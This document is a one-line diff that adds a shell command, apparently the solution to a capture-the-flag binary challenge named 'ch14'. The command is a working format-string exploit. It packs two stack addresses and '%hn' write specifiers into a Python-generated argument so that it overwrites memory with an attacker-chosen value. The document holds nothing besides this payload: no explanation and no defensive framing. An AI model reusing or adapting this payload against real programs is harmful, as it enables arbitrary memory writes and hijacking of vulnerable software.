@@ -1,0 +1,1 @@
+./ch14 $(python -c "print('\xc8\xfa\xff\xbf' + '\xca\xfa\xff\xbf' + '%48871x%9\$hn' + '%8126x%10\$hn' )")
